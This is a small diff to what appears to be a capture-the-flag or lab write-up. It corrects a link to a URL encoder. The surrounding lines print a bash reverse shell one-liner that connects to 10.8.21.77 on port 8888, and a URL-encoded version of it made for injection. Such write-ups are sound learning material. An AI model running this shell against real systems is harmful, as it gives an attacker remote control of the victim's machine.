@@ -185,7 +185,7 @@ Now, I can proceed to create my own reverse shell. I use a [reverse shell genera
 bash -c 'bash -i >& /dev/tcp/10.8.21.77/8888 0>&1'
 ```
 
-The shell doesn't execute as expected, so I use a [URL encoder](hackerrank.com) and convert the above shell into:
+The shell doesn't execute as expected, so I use a [URL encoder](https://www.urlencoder.org/) and convert the above shell into:
 
 ```
 bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.21.77%2F8888%200%3E%261%27
